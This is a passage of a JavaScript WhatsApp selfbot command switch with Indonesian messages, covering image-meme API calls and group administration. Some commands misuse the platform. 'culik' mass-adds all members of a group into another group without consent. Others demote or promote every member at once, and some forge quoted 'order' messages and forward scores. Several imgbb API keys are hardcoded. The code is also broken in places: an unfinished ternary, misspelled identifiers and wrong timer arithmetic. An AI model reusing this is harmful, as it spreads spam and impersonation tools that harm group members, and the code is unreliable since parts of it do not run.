hehe = await getBuffer(`http://zekais-api.herokuapp.com/wanted?url=${anu.display_url}`)
client.sendMessage(from, hehe, image, {quoted: ftroli})
} else {
reply('Reply Imagenya!!')
}
break;
case 'deepfry':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await client.downloadAndSaveMediaMessage(ted)
dppa = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/deepfry?apikey=${LolHuman}&img=${dppa.display_url}`)
client.sendMessage(from, uhyy, image, {quoted: ftroli})
} else {
reply('Reply Imagenya!!')
}
break;
case 'removebg':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
owgi = await client.downloadAndSaveMediaMessage(ted)
dppa = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/removebg?apikey=${LolHuman}&img=${dppa.display_url}`)
client.sendMessage(from, uhyy, image, {quoted: ftroli})
} else {
reply('Reply Imagenya!!')
}
break;
case 'memegen2':
if ((isMedia && !mekvideoMessage || isQuotedImage)) {
var tex1 = body.slice(9).split('|')[0]
var tex2 = body.slice(9).split('|')[1]
if (!tex2) return reply('Format salah!')
var imgbb = require('imgbb-uploader')

var ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
var owgi = await client.downloadAndSaveMediaMessage(ted)
dppa = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
uhyy = await getBuffer(`https://lolhuman.herokuapp.com/api/memegen?apikey=${LolHuman}&texttop=${tex1}&textbottom=${tex2}&img=${dppa.display_url}`)
client.sendMessage(from, uhyy, image, {quoted: ftroli})
}
break;
                              case 'putin':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('a4cf434c0fa32db5c391b3c993d694ab', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/putin?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'gay2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek          
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/gay?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'trigger2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek          
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/trigger?url=${anu.display_url}`)
client.sendMessage(from, ojan, sticker, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
case 'discord2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/discordblack?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
case 'invert2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/invert?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'gay2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/gay2?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'komunis2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/komunis?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'hitler2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/hitler?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'captcha2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/captcha?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'policeline2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/police?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
case 'ssweb':
             if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
             reply(mess.wait)
             ini_link = args[0]
             ini_buffer = await getBuffer(`http://nurutomo.herokuapp.com/api/ssweb?url=${ini_link}&apikey=hardianto`)
             await client.sendMessage(from, ini_buffer, image, { quoted: ftroli })
             break
			 case 'ssweb2':
             if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
             reply(mess.wait)
             ini_link = args[0]
             ini_buffer = await getBuffer(`https://idoganz.herokuapp.com/api/other/ssweb?url=${ini_link}`)
             await client.sendMessage(from, ini_buffer, image, { quoted: ftroli })
             break
 case 'continued2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/continued?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'rip2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/petimati?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
 case 'glass':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/glass?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
case 'wasted2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify().replace('quotedM','m')).message.extendedTextMessage.contextInfo :            
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/wasted?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
case 'glass2':					
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('8e27e77ca275519f8f7f8d76307e0d93', owgi)
ojan = await getBuffer(`https://janbot-api.herokuapp.com/api/imgedit/glass?url=${anu.display_url}`)
client.sendMessage(from, ojan, image, {qouted: mek})
} else {
reply('Reply Imagenya!!')
}
break;
		case 'demoteall':
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                client.groupDemoteAdmin(from, members_id)
                break;
                case 'teruskan':
client.sendMessage(from, `${body.slice(9)}`, MessageType.text, {contextInfo: { forwardingScore: 210, isForwarded: true }})
            break;
            case 'unarchiveall':
                 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await client.chats.all()
                for (let _ of anu) {
                client.modifyChat(_.jid, ChatModification.unarchive)
                }
                break;
            case 'archive':
                 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                client.modifyChat(from, ChatModification.archive)
                break;
                case 'delthischat':
                if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                reply('*succes delete this chat*')
                console.log('succes delete chat = ' + from)
                await sleep(4000)
                client.modifyChat(from, ChatModification.delete)
                break;
                 case 'del':
		        case 'd':
		        case 'delete':              
				client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
				break;           
      case "getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await client.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          client.contacts[ambl] != undefined
            ? client.contacts[ambl].sname || client.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        client.groupUpdateDescription(from, `${args.join(" ")}`);
        client.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        client.groupUpdateSubject(from, `${args.join(" ")}`);
        client.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
	  if (!isGroupAdmins && !isOwner) return reply(`ONLY ADMIN GROUP`)
        if (!isGroup) return;
        ppUrl = await client.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        client.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
       case 'tagall':
				if (!isGroupAdmins && !isOwner) return reply(`ONLY ADMIN GROUP`)
				members_id = []
				teks = (args.length > 1) ? body.slice(8).trim() : ''
				teks += '\n\n'
				for (let mem of groupMembers) {
				teks += `🇭🇰 @${mem.jid.split('@')[0]}\n`
				members_id.push(mem.jid)
				}
				mentions(teks, members_id, true)
				break;
				case 'culik':
              if (!mek.key.fromMe) return fakestatus("LU SIAPA KONTOL? ");
              if (args.length < 1) return reply('Masukin id grupnya tolol')
              let pantek = []
              for (let i of groupMembers) {
              pantek.push(i.jid)
}
              client.groupAdd(args[0], pantek)
              break;
				case 'linkgc':
				 if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
				linkgc = await client.groupInviteCode (from)
				yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group ${groupName}`
				client.sendMessage(from, yeh, text, {quoted: ftroli})				
				break;
				case 'grouplist':
			if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
					client.updatePresence(from, Presence.composing) 
					teks = `\`\`\`Ini adalah list group ${namabot} :\n\n\`\`\``
					no = 0
					for (let hehehe of groupId) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `\n\`\`\`Total grup : ${groupId.length}\`\`\``
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
					break;
                case 'listadmin':
					if (!isGroupAdmins && !isOwner) return reply(`Bukan admin!`)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break;
					case 'infogc':
					client.updatePresence(from, Presence.composing)
					if (!isGroupAdmins && !isOwner) return reply(`Bukan admin!`)
					try {
					ppimg = await clientgetProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					client.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break;
					case 'ownergrup':
				  case 'ownergroup':
               client.updatePresence(from, Presence.composing) 
              options = {
          text: `Owner Group ini adalah : wa.me/${from.split("-")[0]}`,
          contextInfo: { mentionedJid: [from] }
           }
           client.sendMessage(from, options, text, { quoted: mek } )
				break;
				case 'setppbot':
				 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
				client.updatePresence(from, Presence.composing) 
				if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setppbot atau tag gambar yang sudah dikirim`)
				enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await clientdownloadAndSaveMediaMessage(enmedia)
				await client.updateProfilePicture(botNumber, media)
				reply('Makasih profil barunya😗')
				break;
				case 'setdesc2':
                if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");  
                client.groupUpdateDescription(from, `${body.slice(9)}`)
                client.sendMessage(from, '𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺, Change Deskripsi Group', text, {quoted: ftroli})
                break;
                case 'setprofile':
				case 'setpp':
				client.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!mek.key.fromMe) return fakestatus("SELF-BOT");
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await client.downloadAndSaveMediaMessage(enmediau)
					await client.updateProfilePicture(botNumber, mediau)
					client.sendMessage(from, `\`\`\`𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\`\`\``, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: await getBuffer(me.imgUrl), surface: 200, message: fake, orderTitle: fake, sellerJid: '0@s.whatsapp.net'}}}})
					break;
      // Promote Members               
                  case 'demote':
             if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di turunkan admin group!')
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                if (mentioned.length > 1) {
                teks = ''
                for (let _ of mentioned) {
                teks += `𝘰𝘳𝘥𝘦𝘳 𝘳𝘦𝘤𝘦𝘪𝘷𝘦𝘥, 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘭𝘰𝘸𝘦𝘳𝘦𝘥 𝘱𝘢𝘳𝘵𝘪𝘤𝘪𝘱𝘢𝘯𝘵𝘴:\n`
                teks += `@_.split('@')[0]`
                }
                mentions(teks, mentioned, true)
                client.groupDemoteAdmin(from, mentioned)
                } else {
                mentions(`𝘰𝘳𝘥𝘦𝘳 𝘳𝘦𝘤𝘦𝘪𝘷𝘦𝘥, @${mentioned[0].split('@')[0]} 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘭𝘰𝘸𝘦𝘳𝘦𝘥 𝘱𝘢𝘳𝘵𝘪𝘤𝘪𝘱𝘢𝘯𝘵𝘴`, mentioned, true)
                client.groupDemoteAdmin(from, mentioned)
                }
                break;
                case 'promote':
                 if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadikan admin group!')
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                if (mentioned.length > 1) {
                teks = ''
                for (let _ of mentioned) {
                teks += `𝚍𝚘𝚗𝚎,𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝚙𝚛𝚘𝚖𝚘𝚝𝚎 𝘱𝘢𝘳𝘵𝘪𝘤𝘪𝘱𝘢𝘯𝘵𝘴 :\n`
                teks += `@_.split('@')[0]`
                }
                mentions(teks, mentioned, true)
                client.groupMakeAdmin(from, mentioned)
                } else {
                mentions(`done, 🥳 @${mentioned[0].split('@')[0]} 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝚙𝚛𝚘𝚖𝚘𝚝𝚎 𝘱𝘢𝘳𝘵𝘪𝘤𝘪𝘱𝘢𝘯𝘵𝘴`, mentioned, true)
                client.groupMakeAdmin(from, mentioned)
                }
                break;
                case 'promoteall':
			   if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
			                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
                client.groupMakeAdmin(from, members_id)
                break;			    
      case "closegc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        client.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
        case 'tutuptime': 
              client.updatePresence(from, Presence.composing) 
		     if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const close = {
					text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break;
				case 'bukatime': 
              client.updatePresence(from, Presence.composing) 
		        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
                if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const open = {
					text: `Grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *semua peserta* dapat mengirim pesan ke grup ini`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, false);
					reply(open)
				}, timer)
				break;
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        client.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        client.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await client.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              client.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await client.downloadAndSaveMediaMessage(encmedia);
          await client.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              client.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              client.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await client.downloadAndSaveMediaMessage(encmedia);
          await client.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              client.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await client.downloadAndSaveMediaMessage(encmedia);
          await client.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              client.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              client.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
      case "jadibot":
